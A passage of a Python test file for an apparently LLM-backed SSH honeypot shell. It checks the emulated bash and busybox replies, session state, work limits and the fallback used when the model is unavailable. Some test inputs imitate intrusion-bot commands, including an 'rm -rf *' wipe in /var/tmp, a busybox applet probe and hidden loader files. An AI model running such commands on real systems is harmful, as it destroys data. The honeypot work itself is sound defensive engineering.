                                                  "/var/.f\n"]
    assert run(["cd /tmp", ">nope/.f && chmod 777 nope/.f"], session=session) \
        == ["", "-bash: nope/.f: No such file or directory\n"]
    assert "/tmp/nope/.f" not in session.files


def test_a_line_that_cannot_be_parsed_keeps_its_stderr_redirections():
    assert one("foo $X") == "-bash: foo: command not found\n"
    assert one("foo $X 2>/dev/null") == ""
    assert one("foo $X >/dev/null 2>&1") == ""
    assert one("foo $X &>/dev/null") == ""
    assert one("foo $X 2>&1 >/dev/null") == "-bash: foo: command not found\n"
    assert one("foo '2>/dev/null' $X") == "-bash: foo: command not found\n"
    # only the first command's redirections count
    assert one("foo $X; bar 2>/dev/null") == "-bash: foo: command not found\n"
    assert one("foo $X | bar 2>/dev/null") == "-bash: foo: command not found\n"


def test_redirected_fallback_output_stays_within_the_session_limits():
    session = shell.Session(cwd="/root")
    word = "A" * 1000
    line = "; ".join([f"printf {word} >> /tmp/big"] * 3)
    replies = run([line] * 60, session=session)
    assert session.size() <= shell.MAX_SCRATCH_BYTES
    assert len(session.files["/tmp/big"].data) > shell.MAX_SCRATCH_BYTES - 3000
    assert all(r == "" for r in replies)


def test_a_copied_program_reads_its_input():
    out = run(["cp /bin/cat /tmp/c", "echo hello | /tmp/c", "echo data > /tmp/in",
               "/tmp/c < /tmp/in"])
    assert out[1] == "hello\n"
    assert out[3] == "data\n"


# ---- bounded work, pipeline input after a fallback, removed directories --------------------

def _old_columns(names, width=80):
    """The layout search before it was bounded: every column count, for comparison."""
    import math
    best = [names]
    for cols in range(len(names), 0, -1):
        rows = math.ceil(len(names) / cols)
        grid = [names[c * rows:(c + 1) * rows] for c in range(cols)]
        if not grid[-1]:
            continue
        if sum(max(map(len, col)) for col in grid) + 2 * (len(grid) - 1) <= width:
            best = grid
            break
    widths = [max(map(len, col)) + 2 for col in best]
    out = []
    for r in range(len(best[0])):
        cells = [(col[r], w) for col, w in zip(best, widths) if r < len(col)]
        out.append("".join(n.ljust(w) for n, w in cells[:-1]) + cells[-1][0])
    return "\n".join(out) + "\n"


def test_ls_columns_are_laid_out_as_before_in_linear_work():
    import random
    r = random.Random(7)
    for _ in range(300):
        names = sorted({"".join(r.choice("abcdefgh._-") for _ in range(r.randint(1, 14)))
                        for _ in range(r.randint(1, 120))})
        assert shell._columns(names) == _old_columns(names)
    names = list(host().bin_dirs()["/usr/bin"])
    assert shell._columns(names) == _old_columns(names)
    charged = []
    shell._columns(names, charge=charged.append)
    assert len(charged) <= 80 // 3 + 2                 # never one try per name


def _worst(line, h=None, session=None, user="root"):
    """(seconds, charged work, answered) for one line, as the canned shell runs it."""
    sh = shell.Shell(h or host(), user, True, "/root", NOW, None, session or shell.Session())
    started = time.perf_counter()
    answer = sh.run(line, partial=True)
    return time.perf_counter() - started, sh.work, answer is not None


def _fill(part):
    """``part`` repeated as often as one line allows (MAX_LINE and MAX_LIST)."""
    per = part.count(";") + 1
    n = 1
    while len(";".join([part] * (n + 1))) <= shell.MAX_LINE \
            and (n + 1) * per <= shell.MAX_LIST:
        n += 1
    return ";".join([part] * n)


@pytest.mark.parametrize("setup,part", [
    ([], "ls /bin /sbin /usr/bin /usr/sbin /bin /sbin /usr/bin /usr/sbin >/dev/null"),
    ([], "ls /bin /bin /bin /bin /bin /bin /bin /bin >/dev/null"),
    ([], "touch /tmp/a;ls /bin /sbin /usr/bin /usr/sbin>/dev/null"),
    (["touch /tmp/zz"], "touch /tmp/zz;ls /bin /usr/sbin>/dev/null"),
    (["touch /tmp/zz"], "rm a b c d e f g h|rm a b c d e f g h|rm a b c d e f g h"),
    ([f"cp /bin/sh /tmp/f{i}" for i in range(30)], "touch /tmp/a;ls -l /tmp / /tmp />/dev/null"),
    ([f"cp /bin/sh /tmp/f{i}" for i in range(30)], "ls -la /tmp /tmp /tmp /tmp >/dev/null"),
    ([], "cat /bin/sh /bin/ls|while read i; do echo $i; done >/dev/null"),
    ([], "foo>/tmp/a|foo>/tmp/b|foo>/tmp/c|foo>/tmp/d|foo>/tmp/e|foo>/tmp/f|foo>/tmp/g"),
    ([], "printf aaaaaaaaaaaaaaaaaaaa|foo|cat|foo|wc -c|foo|cat|wc -c"),
    ([], "busybox --list>/dev/null"),
    ([], "dd if=/bin/sh bs=1 2>/dev/null >/dev/null"),
])
def test_the_worst_lines_finish_fast_and_are_charged(setup, part):
    """Each line here was built to be slow (the listings took 1.5 s before they were cached
    and charged). Work is charged in rough nanoseconds, so a line within MAX_WORK takes a
    few milliseconds; the time bound is loose for slow CI."""
    h, session = host(), shell.Session()
    run(setup, h, session)
    line = _fill(part)
    seconds, work, _ = _worst(line, h, session)
    assert work <= shell.MAX_WORK + shell.MAX_STAGE_OUTPUT
    assert seconds < 0.25


def test_listing_work_is_charged():
    h = host()
    names = h.bin_dirs()["/usr/bin"]
    _, once, _ = _worst("ls /usr/bin >/dev/null", h)
    assert once > len(names) * shell.STEP              # each name is a step of Python
    _, empty, _ = _worst("ls /root >/dev/null", h)
    assert once - empty > len(names) * shell.STEP


def test_literal_output_feeds_the_next_stage():
    assert one("printf hello | cat") == "hello"
    assert one("printf hello | wc -c") == "5\n"
    assert one("echo hello | cat | wc -c") == "6\n"
    assert one("busybox printf hello | cat") == "hello"
    assert one("echo a b | foo | wc -c") == "-bash: foo: command not found\n0\n"
    assert one("printf hi | foo 2>/dev/null | cat") == ""
    assert one("printf hi > /tmp/p | cat; cat /tmp/p") == "hi"
    # output this shell does not know stays unknown: the next stage is not run on nothing
    assert one("ls --color | wc -l") == ""


def test_a_removed_directory_stays_removed():
    out = run(["mkdir /tmp/d", "touch /tmp/d/x", "rm -r /tmp/d", "cd /tmp/d", "ls /tmp/d",
               "cat /tmp/d/x", "ls /tmp", "mkdir /tmp/d", "ls /tmp/d", "cat /tmp/d/x"])
    assert out[3] == "-bash: cd: /tmp/d: No such file or directory\n"
    assert out[4] == "ls: cannot access '/tmp/d': No such file or directory\n"
    assert out[5] == "cat: /tmp/d/x: No such file or directory\n"
    assert "d\n" not in out[6].split("  ")
    assert out[7] == "" and out[8] == ""
    assert out[9] == "cat: /tmp/d/x: No such file or directory\n"


def test_rm_rf_of_a_nested_tree_and_rmdir():
    out = run(["mkdir -p /tmp/a/b/c", "touch /tmp/a/b/c/f /tmp/a/g", "rm -rf /tmp/a",
               "cd /tmp/a/b", "ls /tmp/a", "mkdir /tmp/a", "ls /tmp/a",
               "mkdir /tmp/e", "touch /tmp/e/x", "rmdir /tmp/e", "rm /tmp/e/x", "rmdir /tmp/e",
               "cd /tmp/e", "rmdir /tmp/e", "rmdir", "busybox rmdir /tmp/e"])
    assert out[3] == "-bash: cd: /tmp/a/b: No such file or directory\n"
    assert out[4] == "ls: cannot access '/tmp/a': No such file or directory\n"
    assert out[5:7] == ["", ""]
    assert out[9] == "rmdir: failed to remove '/tmp/e': Directory not empty\n"
    assert out[10:12] == ["", ""]
    assert out[12] == "-bash: cd: /tmp/e: No such file or directory\n"
    assert out[13] == "rmdir: failed to remove '/tmp/e': No such file or directory\n"
    assert out[14] == "rmdir: missing operand\nTry 'rmdir --help' for more information.\n"
    assert out[15] == "rmdir: '/tmp/e': No such file or directory\n"


def test_mv_of_a_directory_moves_what_is_in_it():
    out = run(["mkdir -p /tmp/a/b", "echo hi > /tmp/a/b/f", "mv /tmp/a /tmp/z",
               "cat /tmp/z/b/f", "cat /tmp/a/b/f", "cd /tmp/a", "ls /tmp/z", "cd /tmp/z/b",
               "pwd", "mv /tmp/z /tmp/z/b"])
    assert out[3] == "hi\n"
    assert out[4] == "cat: /tmp/a/b/f: No such file or directory\n"
    assert out[5] == "-bash: cd: /tmp/a: No such file or directory\n"
    assert out[6] == "b\n" and out[8] == "/tmp/z/b\n"
    assert out[9] == "mv: cannot move '/tmp/z' to a subdirectory of itself, '/tmp/z/b/z'\n"


def test_a_line_starting_with_a_redirection_never_names_an_empty_command():
    assert one(">/var/tmp/.x && cd /var/tmp; rm -rf *") == ""
    session = shell.Session()
    run([f"touch /tmp/f{n}" for n in range(shell.MAX_SCRATCH)], session=session)
    assert one(">/tmp/.f", session=session) == ""      # at the session's cap


def test_the_ssh_fallback_answers_lines_starting_with_a_redirection():
    assert hooks.fallback_reply(">/tmp/.x && echo ok", True, "root") == "ok\r\nroot@srv01:~# "
    assert hooks.fallback_reply(">.t; /bin/busybox ECCHI", False, "root") == \
        "ECCHI: applet not found\n"


def test_the_ssh_fallback_keeps_the_session_files():
    try:
        assert hooks.fallback_reply("cp /bin/echo /tmp/.x", False, "root", session_id="s1") == ""
        assert hooks.fallback_reply("/tmp/.x hi", False, "root", session_id="s1") == "hi\n"
        assert hooks.fallback_reply("cd /tmp", True, "root", session_id="s1") == \
            "root@srv01:/tmp# "
        assert hooks.fallback_reply("/tmp/.x hi", False, "root", session_id="s2") != "hi\n"
        hooks.session_close("s1")
        assert "s1" not in hooks._shell_sessions
        for n in range(hooks.MAX_SHELL_SESSIONS + 5):
            hooks.fallback_reply("true", False, "root", session_id=f"n{n}")
        assert len(hooks._shell_sessions) == hooks.MAX_SHELL_SESSIONS
    finally:
        hooks.reset()


def test_piped_echo_stays_a_fixed_answer():
    a = shell.answer(host(), "echo hello | wc -c", now=NOW)
    assert a.output == "6\n" and a.scope == shell.FIXED
    assert shell.answer(host(), "echo hi > /tmp/x", now=NOW).scope == shell.STATE


def test_a_command_may_remove_its_own_redirection_target():
    out = run(["echo hi > /tmp/x; rm /tmp/x /tmp/nope 2>/tmp/x", "ls /tmp/x",
               "echo hi > /tmp/x; mv /tmp/x /tmp/y 2>/tmp/x; cat /tmp/y"])
    assert out[0] == ""
    assert out[1] == "ls: cannot access '/tmp/x': No such file or directory\n"
    assert out[2] == ""                    # 2>/tmp/x truncated it before mv ran, as in bash


def test_busybox_sh_of_a_missing_script_speaks_as_ash():
    # checked against busybox 1.30.1, 1.35.0 and 1.36.1: same text, status 2
    assert one("busybox sh /tmp/nope") == "sh: can't open '/tmp/nope': No such file or directory\n"
    assert shell.answer(host(), "busybox sh /tmp/nope", now=NOW).status == 2


def test_program_directories_are_built_once_per_kind_of_host():
    assert host().bin_dirs() is host().bin_dirs()
    assert not hasattr(shell.Host, "program")
    assert "busybox" in host().bin_sets()["/usr/bin"]


def test_program_directories_are_left_to_the_model():
    """/bin is /usr/bin under another name, so a file made in one would be missing from the
    other's listing: writes there are not answered here."""
    assert shell.answer(host(), "touch /usr/bin/zz", now=NOW) is None
    assert shell.answer(host(), "echo x > /bin/.x", now=NOW) is None
    assert one(">/bin/.x && echo ok") == "ok\n"
    assert "zz" not in run(["touch /usr/bin/zz", "ls /bin"])[1]


def test_nothing_is_made_inside_a_removed_directory():
    out = run(["mkdir /tmp/d", "rm -r /tmp/d", "touch /tmp/d/x", "echo a > /tmp/d/x",
               "cp /bin/sh /tmp/d/x", "ls /tmp/d/x"])
    assert out[2] == "touch: cannot touch '/tmp/d/x': No such file or directory\n"
    assert out[3] == "-bash: /tmp/d/x: No such file or directory\n"
    assert out[4] == "cp: cannot create regular file '/tmp/d/x': No such file or directory\n"
    assert out[5] == "ls: cannot access '/tmp/d/x': No such file or directory\n"


def test_a_resumed_pipeline_runs_each_stage_once():
    out = run(["cat /tmp/nope | printf hi >> /tmp/x | cat", "cat /tmp/x"])
    assert out[1] == "hi"


def test_the_fallback_session_keeps_its_directory_under_a_model_prompt():
    sid, shown = "fallback-cwd-test", "root@app01:~# "
    try:
        hooks.fallback_reply("cd /tmp", True, "root", host(), None, prompt=shown,
                             session_id=sid)
        out = hooks.fallback_reply("pwd", True, "root", host(), None, prompt=shown,
                                   session_id=sid)
        assert out.startswith("/tmp\r\n")
        assert out.endswith("/tmp# ")
    finally:
        hooks.session_close(sid, None)


def test_recursive_chmod_reaches_files_in_a_session_directory():
    out = run(["mkdir /tmp/d; cp /bin/echo /tmp/d/e; chmod 644 /tmp/d/e", "/tmp/d/e hi",
               "chmod -R 755 /tmp/d", "/tmp/d/e hi"])
    assert "Permission denied" in out[1]
    assert out[2] == ""
    assert out[3] == "hi\n"


class _History:
    """A chat-history chain that answers every model call the same way."""

    def __init__(self, fail: bool = False):
        self.calls: list = []
        self.fail = fail
        self.store: dict = {}

    def get_session_history(self, session_id):
        from langchain_core.chat_history import InMemoryChatMessageHistory

        return self.store.setdefault(session_id, InMemoryChatMessageHistory())

    async def ainvoke(self, payload, config=None):
        from types import SimpleNamespace

        self.calls.append(payload["messages"][-1].content)
        if self.fail:
            raise RuntimeError("provider down")
        return SimpleNamespace(content="model\r\nroot@srv01:/srv# ",
                               usage_metadata={"total_tokens": 10})


def _ask(history, text, sid="own-1"):
    return asyncio.run(hooks.persona_invoke(
        history, session_id=sid, src_ip="203.0.113.9", username="root", text=text,
        interactive=True, llm_config={"configurable": {"session_id": sid}}))


def test_local_answers_read_the_state_the_capped_shell_keeps():
    hooks.set_budget(Budget(BudgetConfig(max_model_commands_per_session=0)))
    history = _History()
    assert _ask(history, "cd /tmp").content == "root@srv01:/tmp# "
    r = _ask(history, "pwd")
    assert r.local_reply and r.content == "/tmp\r\nroot@srv01:/tmp# "
    _ask(history, "echo hi > /tmp/x; touch .h")
    assert "x" in _ask(history, "ls /tmp").content.split("\r\n")
    assert ".h" not in _ask(history, "ls /tmp").content
    assert _ask(history, "cat /tmp/x").content.startswith("hi\r\n")
    assert history.calls == []


def test_a_rejected_local_answer_leaves_the_fallback_state_alone():
    """A state-changing line is tried locally on a copy; the capped shell then runs it on
    the session itself, once."""
    hooks.set_budget(Budget(BudgetConfig(max_model_commands_per_session=0)))
    history = _History()
    _ask(history, "cd /tmp", sid="own-2")
    _ask(history, "echo a >> /tmp/y", sid="own-2")
    assert _ask(history, "cat /tmp/y", sid="own-2").content == "a\r\nroot@srv01:/tmp# "


def test_a_model_error_leaves_the_state_with_the_model_path():
    """A failed model call still counts as the model's turn: later lines that read state go
    to the model (and to the offline shell while it keeps failing), never to a fresh local
    shell."""
    hooks.set_budget(Budget(BudgetConfig()))
    failing = _History(fail=True)
    _ask(failing, "cd /tmp", sid="own-3")
    assert _ask(failing, "pwd", sid="own-3").content == "/tmp\r\nroot@srv01:/tmp# "
    assert failing.calls == ["cd /tmp", "pwd"]


def test_plain_ls_hides_dot_files_the_session_made():
    out = run(["touch /tmp/.loader /tmp/vis; mkdir /tmp/d; touch /tmp/d/.x", "ls /tmp",
               "ls -l /tmp", "ls -a /tmp", "ls -A /tmp", "ls -la /tmp", "ls /tmp/.loader",
               "busybox ls /tmp", "ls /tmp/d", "ls -a /tmp/d", "ls -A /tmp/d"])
    assert ".loader" not in out[1] and "vis" in out[1]
    assert ".loader" not in out[2]
    assert ".loader" in out[3] and out[3].split()[:2] == [".", ".."]
    assert ".loader" in out[4] and "." not in out[4].split() and ".." not in out[4].split()
    assert " .loader\n" in out[5] and " .\n" in out[5]
    assert out[6] == "/tmp/.loader\n"
    assert ".loader" not in out[7]
    assert out[8] == ""
    assert out[9].split() == [".", "..", ".x"]
    assert out[10] == ".x\n"


# ---- replies that match ubuntu:22.04 bash and busybox 1.30.1 ash ---------------------------

def status(lines, h=None):
    """The exit status of the last line, after the others ran in the same session."""
    session = shell.Session()
    run(lines[:-1], h, session=session)
    sh = shell._shell(h or host(), "root", True, "/root", NOW, None, session)
    return sh.run(lines[-1], partial=True).status


def test_gnu_mkdir_and_chmod_quote_with_the_locale_quotes():
    out = run(["mkdir /tmp/w", "mkdir /tmp/w", "chmod 755", "busybox mkdir /tmp/w"])
    assert out[1] == "mkdir: cannot create directory ‘/tmp/w’: File exists\n"
    assert out[2].startswith("chmod: missing operand after ‘755’\n")
    assert out[3] == "mkdir: can't create directory '/tmp/w': File exists\n"


def test_a_session_directory_holds_only_what_the_session_put_there():
    out = run(["mkdir /tmp/w; cd /tmp/w", "cat .h", "cat d/e", "touch d/e", "> d/e",
               "cd nope", "./nope", "/tmp/nope", "ls -a d .h"])
    assert out[1] == "cat: .h: No such file or directory\n"
    assert out[2] == "cat: d/e: No such file or directory\n"
    assert out[3] == "touch: cannot touch 'd/e': No such file or directory\n"
    assert out[4] == "-bash: d/e: No such file or directory\n"
    assert out[5] == "-bash: cd: nope: No such file or directory\n"
    assert out[6] == "-bash: ./nope: No such file or directory\n"
    assert out[7] == ""                  # /tmp is the host's: left to the model
    assert out[8] == ("ls: cannot access 'd': No such file or directory\n"
                      "ls: cannot access '.h': No such file or directory\n")
    assert status(["mkdir /tmp/w; cd /tmp/w", "ls nope"]) == 2
    assert status(["mkdir /tmp/w; cd /tmp/w", "./nope"]) == 127


def test_a_path_below_a_file_is_not_a_directory():
    out = run(["mkdir /tmp/w; cd /tmp/w; touch f a", "cat f/x", "ls f/x", "touch f/x",
               "echo > f/x", "rm f/x", "rm -f f/x", "rmdir f/x", "cd f/x", "chmod 7 f/x",
               "cp a f/x", "cp f/x a", "mv a f/x", "mv f/x a", "./f/x", "mkdir f/x"])
    assert out[1] == "cat: f/x: Not a directory\n"
    assert out[2] == "ls: cannot access 'f/x': Not a directory\n"
    assert out[3] == "touch: cannot touch 'f/x': Not a directory\n"
    assert out[4] == "-bash: f/x: Not a directory\n"
    assert out[5] == "rm: cannot remove 'f/x': Not a directory\n"
    assert out[6] == ""
    assert out[7] == "rmdir: failed to remove 'f/x': Not a directory\n"
    assert out[8] == "-bash: cd: f/x: Not a directory\n"
    assert out[9] == "chmod: cannot access 'f/x': Not a directory\n"
    assert out[10] == "cp: failed to access 'f/x': Not a directory\n"
    assert out[11] == "cp: cannot stat 'f/x': Not a directory\n"
    assert out[12] == "mv: failed to access 'f/x': Not a directory\n"
    assert out[13] == "mv: cannot stat 'f/x': Not a directory\n"
    assert out[14] == "-bash: ./f/x: Not a directory\n"
    assert out[15] == "mkdir: cannot create directory ‘f/x’: Not a directory\n"


def test_busybox_applets_below_a_file():
    out = run(["mkdir /tmp/w; cd /tmp/w; touch f a", "busybox rm -f f/x", "busybox cp f/x a",
               "busybox cp a f/x", "busybox mv f/x a", "busybox mv a f/x", "busybox chmod 7 f/x",
               "busybox touch f/x", "busybox rmdir f/x", "busybox ls f/x", "busybox cat f/x",
               "busybox mkdir -p f/x/y"])
    assert out[1:] == ["rm: can't stat 'f/x': Not a directory\n",
                       "cp: can't stat 'f/x': Not a directory\n",
                       "cp: can't stat 'f/x': Not a directory\n",
                       "mv: can't rename 'f/x': Not a directory\n",
                       "mv: can't stat 'f/x': Not a directory\n",
                       "chmod: f/x: Not a directory\n",
                       "touch: f/x: Not a directory\n",
                       "rmdir: 'f/x': Not a directory\n",
                       "ls: f/x: Not a directory\n",
                       "cat: can't open 'f/x': Not a directory\n",
                       "mkdir: can't create directory 'f/': Not a directory\n"]


def test_mkdir_p_stops_at_a_file_in_the_way():
    out = run(["mkdir /tmp/w; cd /tmp/w; touch a", "mkdir -p a/q/r", "mkdir -p /tmp/w/a/q",
               "ls -a a"])
    assert out[1] == "mkdir: cannot create directory ‘a’: Not a directory\n"
    assert out[2] == "mkdir: cannot create directory ‘/tmp/w/a’: Not a directory\n"
    assert out[3] == "a\n"


def test_session_directories_count_their_subdirectories():
    out = run(["mkdir -p /tmp/w/d/e /tmp/w/d/f; touch /tmp/w/d/x", "ls -la /tmp/w/d"])
    rows = out[1].splitlines()
    assert rows[1].split()[:2] == ["drwxr-xr-x", "4"]
    assert [r.split()[1] for r in rows[3:5]] == ["2", "2"]


def test_cp_and_mv_name_the_same_file_and_skip_directories():
    out = run(["mkdir -p /tmp/w/d; cd /tmp/w; touch a", "cp a a", "cp a .", "mv a ./",
               "mv d d/", "mv d .", "cp d e", "busybox mv a .", "busybox cp d e",
               "busybox mv d d"])
    assert out[1] == "cp: 'a' and 'a' are the same file\n"
    assert out[2] == "cp: 'a' and './a' are the same file\n"
    assert out[3] == "mv: 'a' and './a' are the same file\n"
    assert out[4] == "mv: cannot move 'd' to a subdirectory of itself, 'd/d'\n"
    assert out[5] == "mv: 'd' and './d' are the same file\n"
    assert out[6] == "cp: -r not specified; omitting directory 'd'\n"
    assert out[7] == ""
    assert out[8] == "cp: omitting directory 'd'\n"
    assert out[9] == "mv: can't rename 'd': Invalid argument\n"
    assert status(["mkdir /tmp/w; cd /tmp/w; touch a", "cp a a"]) == 1


def test_more_operands_than_followed_are_left_to_the_model():
    names = " ".join(f"/tmp/f{i}" for i in range(9))
    for command in ("touch", "rm -f", "mkdir", "chmod 755", "rmdir", "cp /bin/sh"):
        assert shell.answer(host(), f"{command} {names}", now=NOW) is None, command


def test_touch_makes_the_other_operands_after_one_fails():
    out = run(["mkdir /tmp/w; cd /tmp/w", "touch d/e a", "ls"])
    assert out[1] == "touch: cannot touch 'd/e': No such file or directory\n"
    assert out[2] == "a\n"


def test_printf_uses_its_format_again_for_the_remaining_arguments():
    assert one("printf '%s\\n' a b") == "a\nb\n"
    assert one("printf '%s-%s|' a b c") == "a-b|c-|"
    assert one("printf x a b") == "x"


def test_cat_shows_errors_where_they_fall():
    out = run(["mkdir /tmp/w; echo hi > /tmp/w/x", "cat /tmp/w/x /tmp/w/no",
               "cat /tmp/w/no /tmp/w/x", "cat /tmp/w/x /tmp/w/no /tmp/w/x",
               "cat /tmp/w/x /tmp/w/no 2>&1 | cat"])
    assert out[1] == "hi\ncat: /tmp/w/no: No such file or directory\n"
    assert out[2] == "cat: /tmp/w/no: No such file or directory\nhi\n"
    # interleaved: not modelled; the fallback shows only the tool's own error
    assert out[3] == "cat: /tmp/w/no: No such file or directory\n"
    assert out[4] == "hi\ncat: /tmp/w/no: No such file or directory\n"


def test_busybox_cat_and_cp_and_touch_speak_as_busybox():
    out = run(["mkdir /tmp/w; cd /tmp/w; mkdir d", "busybox cat nope", "busybox cat d",
               "busybox cp nope x", "busybox cp /bin/sh q/x", "busybox touch q/x",
               "busybox mv d q/x", "busybox rmdir"])
    assert out[1] == "cat: can't open 'nope': No such file or directory\n"
    assert out[2] == "cat: read error: Is a directory\n"
    assert out[3] == "cp: can't stat 'nope': No such file or directory\n"
    assert out[4] == "cp: can't create 'q/x': No such file or directory\n"
    assert out[5] == "touch: q/x: No such file or directory\n"
    assert out[6] == "mv: can't rename 'd': No such file or directory\n"
    assert out[7].startswith("BusyBox v1.36.1") and "Usage: rmdir [-p] DIRECTORY...\n" in out[7]


def test_ls_sorts_as_en_us_and_busybox_ls_as_bytes():
    out = run(["mkdir /tmp/w; cd /tmp/w; touch h .h H _h a A; touch .A b.c bc b-c B",
               "ls -A", "busybox ls -A", "busybox ls -l"])
    assert out[1].split() == "a .A A B b-c b.c bc .h _h h H".split()   # as glibc 2.35
    assert out[2].split() == ".A .h A B H _h a b-c b.c bc h".split()
    assert out[3].splitlines()[1] == \
        "-rw-r--r--    1 root     root             0 Nov 18 11:06 A"


def test_stderr_sent_to_stdout_keeps_its_order():
    out = run(["mkdir /tmp/w; cd /tmp/w; echo hi > a", "cat nope a 2>&1 | cat",
               "cat nope a >f 2>&1; cat f"])
    assert out[1] == "cat: nope: No such file or directory\nhi\n"
    assert out[2] == "cat: nope: No such file or directory\nhi\n"


def test_cd_in_a_pipeline_moves_nobody():
    out = run(["mkdir -p /tmp/w/d; cd /tmp/w/d", "cd /tmp | cat", "pwd", "cd .. | pwd"])
    assert out[2] == "/tmp/w/d\n"
    assert out[3] == "/tmp/w/d\n"


def test_options_may_follow_the_operands():
    out = run(["mkdir /tmp/w/d -p", "touch /tmp/w/d/x -c", "ls -a /tmp/w", "rm /tmp/w/d -r",
               "ls /tmp/w"])
    assert out[0] == "" and out[1] == ""
    assert out[2] == ".  ..  d\n"
    assert out[3] == "" and out[4] == ""


def test_chmod_changes_a_session_directory_and_mv_keeps_it():
    out = run(["mkdir -p /tmp/w/d/q; touch /tmp/w/d/x", "chmod -R 700 /tmp/w/d",
               "ls -la /tmp/w/d", "chmod 750 /tmp/w/d/q; mv /tmp/w/d /tmp/w/e", "ls -l /tmp/w/e",
               "chmod 755 /tmp/w/e/q; ls -l /tmp/w/e"])
    rows = out[2].splitlines()
    assert rows[1].startswith("drwx------ ") and rows[1].endswith(" .")
    assert rows[3].startswith("drwx------ ") and rows[3].endswith(" q")
    assert rows[4].startswith("-rwx------ ") and rows[4].endswith(" x")
    assert out[4].splitlines()[1].startswith("drwxr-x--- ")
    assert out[5].splitlines()[1].startswith("drwxr-xr-x ")


def test_busybox_cp_and_mv_look_at_the_destination_first():
    out = run(["mkdir /tmp/w; cd /tmp/w; touch d", "busybox cp nope d/x", "busybox mv nope d/x",
               "cp nope d/x", "busybox cp d/y d/x", "busybox mv d/y d/x"])
    assert out[1] == "cp: can't stat 'd/x': Not a directory\n"
    assert out[2] == "mv: can't stat 'd/x': Not a directory\n"
    assert out[3] == "cp: failed to access 'd/x': Not a directory\n"
    assert out[4] == "cp: can't stat 'd/y': Not a directory\n"    # a lone source first
    assert out[5] == "mv: can't stat 'd/x': Not a directory\n"
    assert run(["mkdir /tmp/w; touch /tmp/f", "busybox mv /tmp/w /tmp/f"])[1] == \
        "mv: can't rename '/tmp/w': Not a directory\n"


def test_a_file_never_lands_on_a_directory_of_the_same_name():
    session = shell.Session()
    out = run(["mkdir -p /tmp/d/x; echo hi >/tmp/x", "cp /tmp/x /tmp/d", "mv /tmp/x /tmp/d",
               "cat /tmp/x", "cd /tmp/d/x; pwd"], session=session)
    assert out[1] == "cp: cannot overwrite directory '/tmp/d/x' with non-directory\n"
    assert out[2] == "mv: cannot overwrite directory '/tmp/d/x' with non-directory\n"
    assert out[3] == "hi\n"
    assert out[4] == "/tmp/d/x\n"
    assert "/tmp/d/x" not in session.files


def test_mv_no_clobber_keeps_both_files():
    out = run(["echo old >/tmp/dst; echo new >/tmp/src", "mv -n /tmp/src /tmp/dst",
               "cat /tmp/dst /tmp/src"])
    assert out[1] == ""
    assert out[2] == "old\nnew\n"


def test_session_names_do_not_fill_the_shared_collation_cache():
    shell._collate_cached.cache_clear()
    name = "\u0130" * 200
    run([f"touch /tmp/{name}", "ls /tmp", "touch /tmp/" + "a" * 200, "ls /tmp"])
    before = shell._collate_cached.cache_info().currsize
    shell._collate(name)
    shell._collate("a" * 200)
    assert shell._collate_cached.cache_info().currsize == before


def test_the_fallback_follows_the_model_after_the_model_answers_again():
    sid = "fallback-resync-test"
    try:
        hooks.fallback_reply("cd /tmp", True, "root", host(), None,
                             prompt="root@app01:~# ", session_id=sid)
        hooks._note_prompt(sid, "root@app01:/opt# ", "root")      # the model moved it
        out = hooks.fallback_reply("pwd", True, "root", host(), None,
                                   prompt="root@app01:/opt# ", session_id=sid)
        assert out.startswith("/opt\r\n")
        hooks.fallback_reply("cd /tmp", True, "root", host(), None,
                             prompt="root@app01:/opt# ", session_id=sid)
        out = hooks.fallback_reply("pwd", True, "root", host(), None,
                                   prompt="root@app01:/opt# ", session_id=sid)
        assert out.startswith("/tmp\r\n")
    finally:
        hooks.session_close(sid, None)
    assert sid not in hooks._shell_stale
